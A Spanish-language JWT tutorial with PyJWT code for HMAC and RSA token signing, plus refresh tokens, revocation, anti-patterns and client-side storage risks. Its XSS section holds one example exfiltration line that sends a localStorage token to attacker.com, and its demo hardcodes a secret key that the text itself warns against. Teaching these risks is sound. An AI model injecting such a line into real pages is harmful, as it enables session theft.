La teoría es fascinante, pero ¿cómo se ve un JWT en la práctica? Pasemos del concepto al código. Veremos cómo firmar y verificar tokens en Python, manejando tanto el simple 'secreto compartido' como el robusto patrón de 'autógrafo digital' para microservicios.

# JWT

### 4. Implementación Práctica en Python: Del Concepto al Código

Usaremos la librería `PyJWT`, el estándar de facto en Python.

`pip install pyjwt "cryptography"`

#### Ejemplo 1: Firma Simétrica (HMAC-SHA256) - "El Secreto Compartido"

Este es el caso de un monolito o un sistema donde el emisor y el verificador son el mismo.

```python
import jwt
import datetime
import time

# --- SERVIDOR DE AUTENTICACIÓN (Lado de Emisión) ---

# ¡NUNCA guardes el secreto en el código! Usa variables de entorno.
SECRET_KEY = "mi_super_secreto_que_nadie_debe_saber"
ALGORITHM = "HS256"

# Datos del usuario que queremos incluir en el token (claims)
user_id = "user-123"
payload = {
    "sub": user_id,  # 'subject' - el identificador del usuario
    "name": "Alice",
    "roles": ["user", "reader"],
    "iat": datetime.datetime.utcnow(),  # 'issued at' - cuándo se emitió
    "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=30) # 'expiration time' - ¡CRÍTICO!
}

# Crear el token
try:
    access_token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
    print(f"Token generado: {access_token}\n")
except Exception as e:
    print(f"Error al codificar: {e}")


# --- SERVIDOR DE RECURSOS (Lado de Verificación) ---

# El cliente envía el token en el header: "Authorization: Bearer <token>"
received_token = access_token 

# Simulación de un token manipulado
# tampered_token = access_token[:-5] + "abcde"

def verify_token(token):
    try:
        # La decodificación verifica la firma y la expiración automáticamente
        decoded_payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        print("Token VÁLIDO.")
        print(f"Payload decodificado: {decoded_payload}")
        return decoded_payload
    except jwt.ExpiredSignatureError:
        print("Error: El token ha expirado.")
        return None
    except jwt.InvalidTokenError as e:
        # Esto captura firmas inválidas, tokens malformados, etc.
        print(f"Error: Token inválido. Razón: {e}")
        return None

print("--- Verificando el token original ---")
verify_token(received_token)

# Esperamos a que el token expire (para la demo)
# print("\n--- Esperando 2 segundos para que el token expire (si la vida es corta) ---")
# time.sleep(2)
# verify_token(received_token) # Esto fallaría si la expiración fuera de 1 segundo
```

#### Ejemplo 2: Firma Asimétrica (RSA-SHA256) - "El Autógrafo Digital"

Este es el patrón para microservicios. El servidor de autenticación es el único que tiene la clave privada. Los demás servicios solo necesitan la pública para verificar.

Primero, generamos las claves (esto se hace una sola vez):
`openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048`
`openssl rsa -pubout -in private_key.pem -out public_key.pem`

```python
import jwt
import datetime

# --- SERVIDOR DE AUTENTICACIÓN (Posee la clave privada) ---

try:
    with open('private_key.pem', 'rb') as f:
        PRIVATE_KEY = f.read()
    with open('public_key.pem', 'rb') as f:
        PUBLIC_KEY = f.read()
except FileNotFoundError:
    print("Error: Genera las claves 'private_key.pem' y 'public_key.pem' primero.")
    exit()

RSA_ALGORITHM = "RS256"

payload = {
    "sub": "user-456",
    "name": "Bob",
    "iss": "my-auth-server", # 'issuer' - quién emitió el token
    "aud": "my-microservice-api", # 'audience' - para quién es el token
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
    "iat": datetime.datetime.utcnow()
}

# Firmar con la clave PRIVADA
rsa_token = jwt.encode(payload, PRIVATE_KEY, algorithm=RSA_ALGORITHM)
print(f"Token RSA generado: {rsa_token}\n")


# --- MICROSERVICIO DE RECURSOS (Solo conoce la clave pública) ---

def verify_rsa_token(token):
    try:
        # Verificar con la clave PÚBLICA
        # Es crucial especificar el 'audience' si está en el payload
        decoded_payload = jwt.decode(
            token, 
            PUBLIC_KEY, 
            algorithms=[RSA_ALGORITHM],
            audience="my-microservice-api"
        )
        print("Token RSA VÁLIDO.")
        print(f"Payload decodificado: {decoded_payload}")
        return decoded_payload
    except jwt.ExpiredSignatureError:
        print("Error: El token RSA ha expirado.")
        return None
    except jwt.InvalidAudienceError:
        print("Error: El token no está destinado a este servicio (audiencia inválida).")
        return None
    except jwt.InvalidTokenError as e:
        print(f"Error: Token RSA inválido. Razón: {e}")
        return None

print("--- Verificando el token RSA ---")
verify_rsa_token(rsa_token)
```

#### Patrón de Uso Avanzado: Access Tokens y Refresh Tokens
Un `access_token` JWT debe tener una vida corta (5-15 minutos). ¿Por qué? Porque si es robado, el daño es limitado en el tiempo. Pero no queremos que el usuario inicie sesión cada 15 minutos.

La solución es el patrón de **Refresh Token**:
1.  **Login:** El usuario se autentica. El servidor devuelve DOS tokens:
    *   `access_token` (JWT, vida corta, ej. 15 min).
    *   `refresh_token` (Opaco, aleatorio, vida larga, ej. 7 días). Se almacena de forma segura en una base de datos en el servidor, asociado al usuario.
2.  **Uso:** El cliente usa el `access_token` para acceder a los recursos.
3.  **Expiración:** Cuando el `access_token` expira, el cliente recibe un error 401.
4.  **Refresco:** El cliente envía el `refresh_token` a un endpoint especial (`/token/refresh`).
5.  **Validación:** El servidor busca el `refresh_token` en su base de datos. Si es válido y no ha sido revocado, genera un **nuevo** `access_token` y lo devuelve al cliente.

Este patrón combina la eficiencia stateless de los JWT con la seguridad de poder revocar el acceso (invalidando el `refresh_token` en la base de datos).

---

### 5. Nivel Senior - Conceptos Avanzados: Los Trade-offs y las Cicatrices de Batalla

Aquí es donde se separa al programador que usa JWT del arquitecto que lo domina.

#### Trade-offs: ¿Cuándo NO usar JWT?

| Característica de JWT        | Ventaja (Cuándo usarlo)                                                               | Desventaja (Cuándo NO usarlo)                                                                                             |
|------------------------------|---------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------|
| **Stateless (Apátrida)**     | **Microservicios, SPAs.** Excelente para escalabilidad horizontal y desacoplamiento.      | **Necesidad de invalidación inmediata.** No puedes "matar" un JWT. Si necesitas cerrar la sesión de un usuario *al instante*, es un problema. |
| **Autocontenido**            | Reduce las consultas a la base de datos para obtener datos de usuario en cada petición. | **Tamaño del token.** Si incluyes demasiados claims, el token puede volverse grande, aumentando la latencia en cada petición. |
| **Firma Criptográfica**      | **Seguridad y confianza.** Garantiza la integridad y autenticidad de los datos.         | **Rendimiento.** La criptografía asimétrica (RSA/ECDSA) es computacionalmente más costosa que una simple búsqueda en BD.   |

**No uses JWT si:**
*   Necesitas un control absoluto y en tiempo real sobre las sesiones (ej. una aplicación bancaria donde al cambiar la contraseña todas las sesiones deben morir instantáneamente). Una sesión tradicional en servidor es superior aquí.
*   Tu aplicación es un monolito simple que no tiene problemas de escalabilidad. Una sesión tradicional es más simple y segura en ese contexto.

#### Anti-patrones y Errores Comunes

1.  **Almacenar datos sensibles en el Payload:** ¡Recuerda, es Base64, no cifrado! Nunca pongas contraseñas, secretos o PII (Información Personalmente Identificable) sensible aquí.
2.  **Usar `alg: 'none'`:** Una vulnerabilidad histórica. Un atacante podía modificar el payload, cambiar el `alg` a `none` en el header y enviar el token sin firma. La mayoría de las librerías modernas lo bloquean, pero siempre debes validar el algoritmo esperado.
    > "A common mistake is to only verify the signature of a JWT, but not the header. This can allow an attacker to bypass the signature verification by changing the algorithm to `none`." — **Tim McLean**, *Attacking JWT Authentication* (2016)
3.  **No validar `exp`, `iss`, `aud`:** Verificar la firma no es suficiente. Debes validar que el token no ha expirado (`exp`), que fue emitido por una autoridad de confianza (`iss`), y que está destinado a tu servicio (`aud`).
4.  **Tokens que nunca expiran:** Es una puerta abierta a la catástrofe. Si un token es robado, da acceso perpetuo.
5.  **Secretos débiles o compartidos en el código:** El `SECRET_KEY` de HMAC es el corazón de tu seguridad. Debe ser largo, aleatorio y gestionado a través de variables de entorno o un sistema de gestión de secretos (como HashiCorp Vault o AWS Secrets Manager).

#### El Gran Problema: La Revocación de Tokens
Un JWT, una vez emitido, es válido hasta que expira. No hay un mecanismo integrado para invalidarlo antes de tiempo. Este es su "talón de Aquiles".

**Soluciones (con sus propios trade-offs):**

*   **Tokens de vida muy corta (la solución preferida):** Usa access tokens de 5 minutos y refresh tokens. Si un access token es robado, el daño es mínimo. La revocación se maneja invalidando el refresh token en la base de datos.
*   **Denylist (Lista de denegación):** Mantén una lista en una caché rápida (como Redis) de los `jti` (JWT ID, un claim único) de los tokens que han sido revocados. En cada petición, antes de validar el token, comprueba si su `jti` está en la denylist.
    *   *Trade-off:* Esto reintroduce el estado. Estás haciendo una llamada a la red en cada petición, perdiendo parte de la ventaja "stateless" de JWT.

#### Consideraciones de Seguridad: XSS y CSRF
La forma en que almacenas el JWT en el cliente es crucial.

*   **`localStorage` / `sessionStorage`:**
    *   **Pros:** Fácil de acceder con JavaScript.
    *   **Contras:** Vulnerable a ataques **XSS (Cross-Site Scripting)**. Si un atacante puede inyectar JS en tu página, puede robar el token: `fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'))`.
*   **Cookies `HttpOnly`:**
    *   **Pros:** Inaccesible para JavaScript, lo que mitiga el robo por XSS. El navegador lo envía automáticamente.
    *   **Contras:** Vulnerable a ataques **CSRF (Cross-Site Request Forgery)**. Si un usuario está logueado en `mibanco.com` y visita una página maliciosa, esa página puede hacer una petición a `mibanco.com/transferir` y el navegador amablemente adjuntará la cookie.
    *   **Mitigación de CSRF:** Usa el atributo `SameSite=Strict` o `SameSite=Lax` en la cookie y/o implementa tokens anti-CSRF.

**La recomendación moderna:** Para SPAs, a menudo se prefiere el patrón de `access_token` en memoria (en una variable de JS) y `refresh_token` en una cookie `HttpOnly` y `SameSite=Strict` en un path específico (`/token/refresh`).

---

### 6. Referencias y Citaciones Académicas: Sobre Hombros de Gigantes

1.  > "Statelessness, in this context, means that the server does not need to store any state about the client in order to process the request. The session state is kept entirely on the client-side." — **Sam Newman**, *Building Microservices* (2015)
2.  > "A JSON Web Token (JWT) is a self-contained token that can be used to pass identity and claims between two parties. Because JWTs are digitally signed, they can be verified and trusted." — **Auth0 Documentation**, *JWT Handbook* (auth0.com)
3.  > "The suggested pronunciation of JWT is the same as the English word 'jot'." — **M. Jones, J. Bradley, N. Sakimura**, *RFC 7519: JSON Web Token (JWT)* (2015) - [https://tools.ietf.org/html/rfc7519](https://tools.ietf.org/html/rfc7519)
4.  > "Public-key cryptography provides a secure channel over an insecure medium, a paradox that has been the foundation of modern secure communication." — **Simon Singh**, *The Code Book: The Science of Secrecy from Ancient Egypt to Quantum Cryptography* (1999)
5.  > "The JWS Compact Serialization represents a signed message as a compact, URL-safe string. This representation is commonly used in protocols that transport signed messages in URLs or HTTP headers." — **M. Jones, J. Bradley, N. Sakimura**, *RFC 7515: JSON Web Signature (JWS)* (2015) - [https://tools.ietf.org/html/rfc7515](https://tools.ietf.org/html/rfc7515)
6.  > "The fundamental trade-off in choosing a token-based authentication strategy is between statefulness and the ability to revoke tokens." — **Dominick Baier**, *IdentityServer Documentation*
7.  > "Don't roll your own crypto. The history of computer security is littered with the smoking remains of homegrown cryptographic algorithms and protocols." — **Bruce Schneier**, *Cryptography Engineering: Design Principles and Practical Applications* (2010)
8.  > "The OAuth 2.0 authorization framework enables a third-party application to obtain limited access to an HTTP service... by orchestrating an approval interaction between the resource owner and the HTTP service, or by allowing the third-party application to obtain access on its own behalf." — **D. Hardt**, *RFC 6749: The OAuth 2.0 Authorization Framework* (2012) - [https://tools.ietf.org/html/rfc6749](https://tools.ietf.org/html/rfc6749)
9.  > "The `alg` (algorithm) Header Parameter identifies the cryptographic algorithm used to secure the JWS. The JWS Signature value is not valid if the `alg` value does not represent a supported algorithm, or if there is a mismatch between the algorithm specified in the JOSE Header and the algorithm used to generate the JWS Signature." — **IETF JOSE Working Group**, *RFC 7518: JSON Web Algorithms (JWA)* (2015) - [https://tools.ietf.org/html/rfc7518](https://tools.ietf.org/html/rfc7518)
10. > "In a distributed system, you are going to have partial failures. The network can fail, a machine can crash. A core design principle is to build systems that can tolerate these failures." — **Werner Vogels (CTO of Amazon)**, *A Decade of Dynamo* (2017) - JWTs, by being stateless, help build systems resilient to the failure of a single authentication node.

### Conclusión: El Sello del Arquitecto
Dominar JWT no es memorizar los nombres de los claims. Es comprender la danza entre estado y statelessness, entre seguridad y rendimiento, entre la teoría criptográfica y la cruda realidad de la implementación.

Es saber que un JWT es un pasaporte, no una caja fuerte. Es entender que su mayor fortaleza —la confianza descentralizada— es también la fuente de su mayor debilidad —la difícil revocación—. Un arquitecto senior no solo sabe *cómo* usar JWT, sino que sabe *por qué* lo está usando, puede justificar esa decisión frente a otras alternativas, y puede diseñar un sistema robusto y seguro alrededor de sus fortalezas y debilidades.

Ahora, ve y construye sistemas seguros. Pero recuerda, como con cualquier herramienta poderosa, la sabiduría no está en la herramienta misma, sino en la mano que la empuña.